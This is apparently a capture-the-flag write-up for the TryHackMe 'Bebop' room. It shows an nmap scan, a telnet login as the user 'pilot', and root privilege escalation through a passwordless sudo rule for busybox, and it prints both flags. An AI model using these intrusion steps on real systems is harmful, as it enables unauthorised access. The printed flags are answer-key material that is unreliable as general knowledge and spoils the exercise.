> Bebop

# Nmap

nmap -sC -sV -T4 -Pn -vv -A -oN nmap/initial $IP

```
22/tcp   open     ssh            syn-ack     OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
23/tcp   open     telnet         syn-ack     BSD-derived telnetd
```

Looks like telnet is open and we are given our username `pilot`.

telnet $IP

# user.txt 

```
THM{r3m0v3_b3f0r3_fl16h7}
```

# Privilege Escalation

sudo -l

```
User pilot may run the following commands on freebsd:
    (root) NOPASSWD: /usr/local/bin/busybox
```

And looking at GTFO bins we got a hit. `sudo busybox sh`. Wow! we are root!

# root.txt

```
THM{h16hw4y_70_7h3_d4n63r_z0n3}
```